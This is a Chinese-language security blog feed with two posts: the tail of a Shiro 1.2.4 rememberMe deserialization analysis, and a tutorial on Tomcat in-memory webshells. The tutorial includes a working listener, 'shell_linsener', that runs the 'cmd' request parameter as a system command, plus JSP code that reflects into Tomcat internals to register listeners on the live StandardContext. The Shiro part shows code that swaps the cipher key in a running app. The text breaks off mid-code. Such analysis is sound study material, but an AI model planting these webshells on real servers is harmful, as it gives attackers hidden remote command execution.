<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">       location.search();</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GetMapping(&quot;/hello1&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">hello1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;hello1&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>访问hello是获取CookieRememberMeManager并修改key。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_target(fields[i],obj)) &#123;</span><br><span class="line">System.out.println(path+<span class="string">&quot;---&gt;&quot;</span>+fields[i].getName()+<span class="string">&quot;(&quot;</span>+fields[i].get(obj).getClass().getName()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="type">CookieRememberMeManager</span> <span class="variable">cookieRememberMeManager</span> <span class="operator">=</span> (CookieRememberMeManager) fields[i].get(obj);</span><br><span class="line">System.out.println( Base64.encodeToString(cookieRememberMeManager.getDecryptionCipherKey()));</span><br><span class="line">cookieRememberMeManager.setCipherKey(Base64.decode(<span class="string">&quot;3AvVhmFLUs0KTA3Kprsdag==&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们在AbstractRememberMeManager的里面下两个断点。</p>
<ul>
<li>convertPrincipalsToBytes &#x2F;&#x2F;生成rememberMe，会调用到encrypt</li>
<li>convertPrincipalsToBytes &#x2F;&#x2F;解密rememberMe，会调用decrypt</li>
</ul>
<p><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787962699312.jpg"></p>
<p>然后我们登录。<br>断点捕获到之后，我们调用评估表达式输入Base64.encodeToString(getDecryptionCipherKey())<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787964456018.jpg"></p>
<p>我们发现key为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。是默认的。</p>
<p>之后我们访问一下hello1。<br>发现key也是kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787966538890.jpg"></p>
<p>之后我们在访问一下hello，在访问hello1。<br>我们发现key已经被改了。<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787967502370.jpg"></p>
<p>并且我们的登录认证也掉了。需要重新登陆。<br>我在再重新登陆一下。<br>我们可以发现重新登陆的key也是修改之后的。<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787968468697.jpg"></p>
<p>只要不重启，key就是我们修改之后的。</p>
<p>因为我们的key是从线程里获取的Thread.currentThread()，所有我们反序列化的时候就可以进行key的修改。</p>
<p>还有另一种key的修改方式，是通过agent技术里面的Instrumentation，这里就不展开讲了。</p>
<h4 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h4><p>因为headers有长度限制，我们的payload如果复杂，可能过长，导致报错。这种情况，我们可以在rememberMe里面先传加载器。加载器先获取当前线程的request然后通过对body的操作进行复杂操作，这个加载器，我们后面文章在说。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>JAVASEC</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat动态注册内存马</title>
    <url>/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="tomcat动态注册内存马"><a href="#tomcat动态注册内存马" class="headerlink" title="tomcat动态注册内存马"></a>tomcat动态注册内存马</h2><p>去年10月学了一段时间内存马，并没有好好整理这段知识，今天重新梳理一下tomcat内存马的相关知识。</p>
<span id="more"></span>


<h3 id="javax-servlet-ServletContext"><a href="#javax-servlet-ServletContext" class="headerlink" title="javax.servlet.ServletContext"></a>javax.servlet.ServletContext</h3><p>首先为什么我们可以在容器中动态添加内存马，那是因为Servlet 3.0提供了动态注册这种机制，我们可以看到在<strong>javax.servlet.ServletContext</strong>接口中定义了如<strong>addServlet</strong>、<strong>addFilter</strong>、<strong>addListener</strong>这些接口。正因为有了这些接口，我们可以在具体的实现这些接口的类里面进行动态添加内存马。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ServletContext</span> &#123;</span><br><span class="line">   </span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">Servlet</span>&gt; T <span class="title function_">createServlet</span><span class="params">(Class&lt;T&gt; var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line">    ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String var1, Class&lt;? extends Servlet&gt; var2)</span>;</span><br><span class="line"></span><br><span class="line">    FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String var1, Class&lt;? extends Filter&gt; var2)</span>;</span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">Filter</span>&gt; T <span class="title function_">createFilter</span><span class="params">(Class&lt;T&gt; var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addListener</span><span class="params">(Class&lt;? extends EventListener&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">EventListener</span>&gt; T <span class="title function_">createListener</span><span class="params">(Class&lt;T&gt; var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line">     <span class="keyword">void</span> <span class="title function_">addListener</span><span class="params">(Class&lt;? extends EventListener&gt; var1)</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们使用的容器是tomcat时，我们使用idea查找所有实现ServletContext接口的类我们发现有五个。在不了解tomcat是如何添加<strong>addServlet</strong>、<strong>addFilter</strong>、<strong>addListener</strong>前提下我们也可以知道，动态添加内存马的关键在这五个类里面。<br><img src="/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/16780781455837.jpg"></p>
<h3 id="tomcat注册Listener"><a href="#tomcat注册Listener" class="headerlink" title="tomcat注册Listener"></a>tomcat注册Listener</h3><p>Listener类都是实现了EventListener接口的类，所以实现类有很多，这里我们看一下实现了EventListener接口的ServletRequestListener接口。他有两个待实现函数，分别代表着request初始化时监听和request销毁时监听，非常适合做内存马。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> javax.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.EventListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ServletRequestListener</span> <span class="keyword">extends</span> <span class="title class_">EventListener</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent var1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们实现一个简单的ServletRequestListener看一下linsener是如何被调用的。这里我们写的是requestDestroyed，因为每次请求结束request对象就会被销毁，所以可以调用到我们的监听。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener(&quot;/TestListener&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_linsener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent s)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) s.getServletRequest();<span class="comment">//下断点</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// org.apache.catalina.connector.Request</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">reqObj</span> <span class="operator">=</span> reqField.get(req);</span><br><span class="line">            <span class="comment">// org.apache.catalina.connector.Response</span></span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">rep</span> <span class="operator">=</span> (HttpServletResponse) reqObj.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(reqObj);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> rep.getWriter();</span><br><span class="line"><span class="comment">//            rep.sendError(404);</span></span><br><span class="line">            out.println(<span class="string">&quot;linsener_resp_test&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(NoSuchFieldException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent s)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们在HttpServletRequest req &#x3D; (HttpServletRequest) s.getServletRequest();这一行下断点。会发现调用链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">requestDestroyed:<span class="number">22</span>, shell_linsener (org.hang.web_test)</span><br><span class="line">fireRequestDestroyEvent:<span class="number">6019</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">177</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">698</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">367</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">639</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">885</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1693</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>fireRequestDestroyEvent调用了我们写的linsener，我们跟进fireRequestDestroyEvent看一下他是逻辑是怎么样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">fireRequestDestroyEvent</span><span class="params">(ServletRequest request)</span> &#123;</span><br><span class="line">    Object[] instances = <span class="built_in">this</span>.getApplicationEventListeners();<span class="comment">//获取所有的listener</span></span><br><span class="line">    <span class="keyword">if</span> (instances != <span class="literal">null</span> &amp;&amp; instances.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">ServletRequestEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestEvent</span>(<span class="built_in">this</span>.getServletContext(), request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; instances.length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> instances.length - <span class="number">1</span> - i;</span><br><span class="line">            <span class="keyword">if</span> (instances[j] != <span class="literal">null</span> &amp;&amp; instances[j] <span class="keyword">instanceof</span> ServletRequestListener) &#123;</span><br><span class="line">                <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> (ServletRequestListener)instances[j];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    listener.requestDestroyed(event);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var8) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(var8);</span><br><span class="line">                    <span class="built_in">this</span>.getLogger().error(sm.getString(<span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;instances[j].getClass().getName()&#125;), var8);</span><br><span class="line">                    request.setAttribute(<span class="string">&quot;javax.servlet.error.exception&quot;</span>, var8);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键代码Object[] instances &#x3D; this.getApplicationEventListeners();意思是获取所有的linsener并形成数组，如果数组不为空，则执行每个数组的listener.requestDestroyed(event);</p>
<hr>
<p>这里我们再继续看一下getApplicationEventListeners()这个方法。位于org.apache.catalina.core.StandardContext，可以看到返回的是applicationEventListenersList这个数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.applicationEventListenersList.toArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>我们再看一下applicationEventListenersList这个列表是哪里来的。<br>可以看到他是一个CopyOnWriteArrayList数组，既然是数组我们就可以使用add方法进行添加。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private List&lt;Object&gt; applicationEventListenersList = new CopyOnWriteArrayList();</span><br></pre></td></tr></table></figure>

<hr>
<p>所以我们在org.apache.catalina.core.StandardContext找一下哪里调用了applicationEventListenersList。add方法。</p>
<p>我们找到了两个地方可以调用add。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setApplicationEventListeners</span><span class="params">(Object[] listeners)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.applicationEventListenersList.clear();</span><br><span class="line">        <span class="keyword">if</span> (listeners != <span class="literal">null</span> &amp;&amp; listeners.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.applicationEventListenersList.addAll(Arrays.asList(listeners));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.applicationEventListenersList.add(listener);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>学了反射我们有很多种方式可以在我们自己创建的StandardContext中添加我们的listeners（<strong>在我们的环境中</strong>）。下放列举一种例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">ct1</span> <span class="operator">=</span> c.getConstructor();<span class="comment">//不会初始化，无参构造</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">obj</span> <span class="operator">=</span> (StandardContext)ct1.newInstance();</span><br><span class="line"><span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;&#125;</span><br><span class="line">obj.addApplicationEventListener(listener);</span><br></pre></td></tr></table></figure>

<p>但是由于tomcat架构的原因，我们不能这样操作，我们得添加到<strong>对方的StandardContext</strong>里面去。</p>
<p>那么如何才能获取到当前应用的StandardContext呢，也就是当前运行中tomcat的StandardContext呢。<br>还是看我们的调用链，我们在invoke:177, StandardHostValve (org.apache.catalina.core)&#x2F;&#x2F;看这一行，跟进去一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">requestDestroyed:<span class="number">22</span>, shell_linsener (org.hang.web_test)</span><br><span class="line">fireRequestDestroyEvent:<span class="number">6019</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">177</span>, StandardHostValve (org.apache.catalina.core)<span class="comment">//看这一行</span></span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">698</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">367</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">639</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">885</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1693</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>发现他调用了context.fireRequestDestroyEvent</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!request.isAsync() &amp;&amp; !asyncAtStart) &#123;</span><br><span class="line">                        context.fireRequestDestroyEvent(request.getRequest());</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>

<p>然后我们再找一下context.fireRequestDestroyEvent的context是哪里来的，发现 <strong>Context context &#x3D; request.getContext();</strong> 也就是说可以通过当前应用的request来获取当前应用的context。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> request.getContext();</span><br><span class="line">        <span class="keyword">if</span> (context == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!response.isError()) &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>我们去org.apache.catalina.connector.Request包里，也是可以发现存在getContext方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Context <span class="title function_">getContext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.mappingData.context;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>也就是说我们可以通过Request来获取Context，那我们如何获取当前应用的Request呢。</p>
<h4 id="JSP写Listener"><a href="#JSP写Listener" class="headerlink" title="JSP写Listener"></a>JSP写Listener</h4><p>首先我们先看jsp如何写Listener。因为jsp内置了Request，我们写个简单的程序下断点跟进一下。</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">HttpSession</span> <span class="variable">s</span> <span class="operator">=</span> request.getSession();<span class="comment">//下断点</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以看到请求的过程中存在request和response，他们的对象为RequestFacade<br><img src="/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/16780781812111.jpg"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">_jspService:<span class="number">16</span>, test_jsp (org.apache.jsp)</span><br><span class="line">service:<span class="number">70</span>, HttpJspBase (org.apache.jasper.runtime)</span><br><span class="line">service:<span class="number">765</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">465</span>, JspServletWrapper (org.apache.jasper.servlet)</span><br><span class="line">serviceJspFile:<span class="number">383</span>, JspServlet (org.apache.jasper.servlet)</span><br><span class="line">service:<span class="number">331</span>, JspServlet (org.apache.jasper.servlet)</span><br><span class="line">service:<span class="number">765</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">231</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">52</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">197</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">543</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">135</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">698</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">367</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">639</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">885</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1693</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>我们查看一下RequestFacade，发现其存在Request变量。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestFacade</span> <span class="keyword">implements</span> <span class="title class_">HttpServletRequest</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="literal">null</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里我们可以通过反射RequestFacade获取Request。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);<span class="comment">//因为是protected</span></span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) f.get(request);<span class="comment">//反射获取值</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext(); <span class="comment">//直接通过request获取StandardContext</span></span><br></pre></td></tr></table></figure>

<p>完整jsp代码如下：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="literal">true</span>);<span class="comment">//因为是protected</span></span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) f.get(request);<span class="comment">//反射获取值</span></span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext(); <span class="comment">//直接通过request获取StandardContext</span></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// org.apache.catalina.connector.Request</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">reqObj</span> <span class="operator">=</span> reqField.get(req);</span><br><span class="line">                <span class="comment">// org.apache.catalina.connector.Response</span></span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">rep</span> <span class="operator">=</span> (HttpServletResponse) reqObj.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(reqObj);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> 